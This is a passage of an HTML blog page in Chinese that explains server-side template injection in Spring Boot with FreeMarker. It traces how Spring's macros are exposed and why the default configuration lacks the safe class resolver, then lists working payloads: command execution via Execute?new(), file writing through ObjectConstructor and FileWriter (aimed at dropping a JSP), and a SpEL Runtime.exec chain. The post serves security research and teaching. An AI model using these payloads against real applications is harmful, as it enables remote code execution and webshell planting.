@@ -1,0 +1,990 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lingx5">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="springboot SSTI 攻击前置知识环境整合可以看这篇文章： Spring Boot 整合 Freemarker 模板引擎 - spring 中文网 在文章中也介绍了关于 springboot 中定义的 freemarker 宏的一些知识  spring.freemarker.expose-spring-macro-helpers 设置为 true 可以暴露 spring 官方提供的宏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SpringBoot下的SSTI攻击方式">
+<meta property="og:url" content="http://lingx5.github.io/2025/08/26/SpringBoot%E4%B8%8B%E7%9A%84SSTI%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/index.html">
+<meta property="og:site_name" content="lingx5的博客">
+<meta property="og:description" content="springboot SSTI 攻击前置知识环境整合可以看这篇文章： Spring Boot 整合 Freemarker 模板引擎 - spring 中文网 在文章中也介绍了关于 springboot 中定义的 freemarker 宏的一些知识  spring.freemarker.expose-spring-macro-helpers 设置为 true 可以暴露 spring 官方提供的宏">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813093633465.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813093759999.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813094059516.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813102521015.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813112848475.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813113202549.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813113512136.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813113626410.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813121737589.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813122501543.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813122549914.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813122733029.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813122920074.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813123847798.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250814090441098.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250814090727799.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250814090741369.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250814093019568.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250814093946236.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250814095740234.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250814101541840.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250814152656135.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250814152806155.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250814152920295.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250819224040777.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250819224133300.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250822194951808.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250822195012874.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250825144829861.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250825144432830.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250825144551771.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250825144605943.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250826095733171.png">
+<meta property="article:published_time" content="2025-08-26T02:20:57.000Z">
+<meta property="article:modified_time" content="2025-08-26T02:24:08.886Z">
+<meta property="article:author" content="lingx5">
+<meta property="article:tag" content="java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250813093633465.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SpringBoot下的SSTI攻击方式 - lingx5的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lingx5.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Q4th1PtYC02FHNKGV3QVJgNX-MdYXbMMI","app_key":"Y9vGCfdqm9u55ZBjM8ep8KDX","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-3-23","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lingx5的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SpringBoot下的SSTI攻击方式"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-26 10:20" pubdate>
+          2025年8月26日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="SSTI模板注入"
+        id="heading-5d6fd16f2534c7c4c6e877469949647e" role="tab" data-toggle="collapse" href="#collapse-5d6fd16f2534c7c4c6e877469949647e"
+        aria-expanded="true"
+      >
+        SSTI模板注入
+        <span class="list-group-count">(2)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-5d6fd16f2534c7c4c6e877469949647e"
+           role="tabpanel" aria-labelledby="heading-5d6fd16f2534c7c4c6e877469949647e">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2025/08/26/SpringBoot%E4%B8%8B%E7%9A%84SSTI%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" title="SpringBoot下的SSTI攻击方式"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">SpringBoot下的SSTI攻击方式</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/08/26/java-SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="java-SSTI 模板注入"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">java-SSTI 模板注入</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SpringBoot下的SSTI攻击方式</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer" />
+
+<h1 id="springboot-SSTI-攻击"><a href="#springboot-SSTI-攻击" class="headerlink" title="springboot SSTI 攻击"></a>springboot SSTI 攻击</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>环境整合可以看这篇文章： <a target="_blank" rel="noopener" href="https://springdoc.cn/springboot-freemarker/">Spring Boot 整合 Freemarker 模板引擎 - spring 中文网</a></p>
+<p>在文章中也介绍了关于 springboot 中定义的 freemarker 宏的一些知识</p>
+<blockquote>
+<p><code>spring.freemarker.expose-spring-macro-helpers</code> 设置为 <code>true</code> 可以暴露 spring 官方提供的宏。这些宏提供了国际化、表单绑定等等功能。</p>
+<p>这些宏定义在 <code>spring-webmvc</code> 模块的 <code>/org/springframework/web/servlet/view/freemarker/spring.ftl</code> 文件中。</p>
+</blockquote>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813093633465.png" srcset="/img/loading.gif" lazyload alt="image-20250813093633465"></p>
+<p>springMacroRequestContext 的定义是在 org.springframework.web.servlet.view.AbstractTemplateView 中</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813093759999.png" srcset="/img/loading.gif" lazyload alt="image-20250813093759999"></p>
+<p>在 org.springframework.web.servlet.view.AbstractTemplateView#renderMergedOutputModel 方法中可以看到 springMacroRequestContext 是向 freemarker 模板中绑定的 org.springframework.web.servlet.support.RequestContext 类</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813094059516.png" srcset="/img/loading.gif" lazyload alt="image-20250813094059516"></p>
+<p>RequestContext </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813102521015.png" srcset="/img/loading.gif" lazyload alt="image-20250813102521015"></p>
+<blockquote>
+<p>这里 RequestContext 没有继承 TemplateModel 为什么在宏定义文件中可以使用${springMacroRequestContext.getMessage(“ welcome.message “)} 调用方法呢？</p>
+<p>答案也很简单，我们跟一些 Model 的传递过程，不难发现在 freemarker.template.Template#createProcessingEnvironment 方法中，对传递的 HashMap 统一做了封装</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Environment <span class="hljs-title function_">createProcessingEnvironment</span><span class="hljs-params">(Object dataModel, Writer out, ObjectWrapper wrapper)</span> <span class="hljs-keyword">throws</span> TemplateException, IOException &#123;<br>    TemplateHashModel dataModelHash;<br>    <span class="hljs-keyword">if</span> (dataModel <span class="hljs-keyword">instanceof</span> TemplateHashModel) &#123;<br>        dataModelHash = (TemplateHashModel)dataModel;<br>    &#125; <br></code></pre></td></tr></table></figure></blockquote>
+<p>简单使用 spring 中的宏可以参考：<a target="_blank" rel="noopener" href="https://springdoc.cn/spring/web.html#mvc-view-freemarker-forms">https://springdoc.cn/spring/web.html#mvc-view-freemarker-forms</a></p>
+<p>创建 PersonForm 类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.springssti;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonForm</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>表单模板 form.ftl</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#import &quot;/spring.ftl&quot; as spring/&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>    Name:<br>    &lt;@spring.bind &quot;personForm.name&quot;/&gt;<br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span><br><span class="hljs-tag">           <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;$&#123;spring.status.expression&#125;&quot;</span></span><br><span class="hljs-tag">           <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;spring.status.value!&quot;</span>&quot;&#125;&quot;/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    &lt;#list spring.status.errorMessages as error&gt; <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>$&#123;error!&quot;Error&quot;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span> &lt;/#list&gt;<br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>结果表单 result.ftl</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Form Result<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Form Submitted Successfully<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: $&#123;personForm.name!&quot;Unknown&quot;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>请求处理器 FormController</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.springssti.controller;<br><br><span class="hljs-keyword">import</span> com.lingx5.springssti.PersonForm;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ModelAttribute;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FormController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/form&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">showForm</span><span class="hljs-params">(Model model)</span> &#123;<br>        model.addAttribute(<span class="hljs-string">&quot;personForm&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonForm</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;form&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/form&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">submitForm</span><span class="hljs-params">(<span class="hljs-meta">@ModelAttribute</span> PersonForm personForm, Model model)</span> &#123;<br>        model.addAttribute(<span class="hljs-string">&quot;personForm&quot;</span>, personForm);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;result&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813112848475.png" srcset="/img/loading.gif" lazyload alt="image-20250813112848475"></p>
+<p>可以在 org.springframework.web.servlet.view.AbstractTemplateView#renderMergedOutputModel 中打断点</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813113202549.png" srcset="/img/loading.gif" lazyload alt="image-20250813113202549"></p>
+<p>看看 Spring 是如何加载宏，如何调用的</p>
+<p>启动项目，访问 <code>http://localhost:8080/form</code> 来到断点处</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813113512136.png" srcset="/img/loading.gif" lazyload alt="image-20250813113512136"></p>
+<p>我们接着跟 model 的处理流程</p>
+<p>步入 FreeMarkerView#renderMergedTemplateModel，看到 exposeHelpers 是空方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813113626410.png" srcset="/img/loading.gif" lazyload alt="image-20250813113626410"></p>
+<p>接着进入  doRender 其中 exposeModelAsRequestAttributes 是把 model 对应的键值对，暴露 为 HTTP 请求（HttpServletRequest）的属性。</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813121737589.png" srcset="/img/loading.gif" lazyload alt="image-20250813121737589"></p>
+<p>步入 buildTemplateModel ，看到他把 model 封装为了 AllHttpScopesHashModel 这个类</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813122501543.png" srcset="/img/loading.gif" lazyload alt="image-20250813122501543"></p>
+<p>继承了 SimpleHash</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813122549914.png" srcset="/img/loading.gif" lazyload alt="image-20250813122549914"></p>
+<p>接着到 FreeMarkerView#processTemplate 方法 , 后面的 env.process() 就是模板识别填充的执行了</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813122733029.png" srcset="/img/loading.gif" lazyload alt="image-20250813122733029"></p>
+<p>跟一下 freemarker.template.Template#createProcessingEnvironment 方法，把 model 强转为了 TemplateHashModel 类</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813122920074.png" srcset="/img/loading.gif" lazyload alt="image-20250813122920074"></p>
+<p>这基本就是我们可以直接调用的原因</p>
+<p>调用栈</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250813123847798.png" srcset="/img/loading.gif" lazyload alt="image-20250813123847798"></p>
+<h2 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h2><p>在 spring 3.5.4 虽然默认添加的 freemarker 的 starter 依赖包虽然为 2.3.34 版本</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250814090441098.png" srcset="/img/loading.gif" lazyload alt="image-20250814090441098"></p>
+<p>但是在 springboot 的 freemarker.template.Configuration 初始化的时候 (用户不做更改的情况下)  默认配置为 freemarker 2.3.0 版本</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250814090727799.png" srcset="/img/loading.gif" lazyload alt="image-20250814090727799"></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250814090741369.png" srcset="/img/loading.gif" lazyload alt="image-20250814090741369"></p>
+<p>这就意味着安全策略 unsafeMethods.properties 并没有引入，且没有引入 TemplateClassResolver.SAFER_RESOLVER 安全策略防范 <code>?new()</code> 创建实例</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="Execute"><a href="#Execute" class="headerlink" title="Execute"></a>Execute</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;calc&quot;)&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250814093019568.png" srcset="/img/loading.gif" lazyload alt="image-20250814093019568"></p>
+<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;java.io.FileWriter&quot;</span>,<span class="hljs-string">&quot;d:\\1.txt&quot;</span>).append(<span class="hljs-string">&quot;aaaaaa&quot;</span>).close()&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250814093946236.png" srcset="/img/loading.gif" lazyload alt="image-20250814093946236"></p>
+<p>默认路径为 项目根路径，要写木马的话还需要知道项目内部路径，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;java.io.FileWriter&quot;</span>,<span class="hljs-string">&quot;1a.jsp&quot;</span>).append(<span class="hljs-string">&quot;aaaaaa&quot;</span>).close()&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250814095740234.png" srcset="/img/loading.gif" lazyload alt="image-20250814095740234"></p>
+<p>但是 springboot3 以后默认不支持 jsp 解析，在 springboot2 中，只能写到 <code>/WEB-INF/jsp/</code> </p>
+<blockquote>
+<p>Spring Boot 3.0 no longer supports JSPs.<br>If you want to use JSPs, you need to deploy your application as a traditional WAR to a servlet container.</p>
+</blockquote>
+<p>如果写文件还是写定时任务，执行反弹 shell 吧，也有师傅研究了在 java 层面如何命令执行：<a target="_blank" rel="noopener" href="https://landgrey.me/blog/22/">springboot 写文件到 RCE</a> </p>
+<h3 id="SPEL-exec"><a href="#SPEL-exec" class="headerlink" title="SPEL exec"></a>SPEL exec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;</span>).parseExpression(<span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>).getValue()&#125;<br></code></pre></td></tr></table></figure>
+
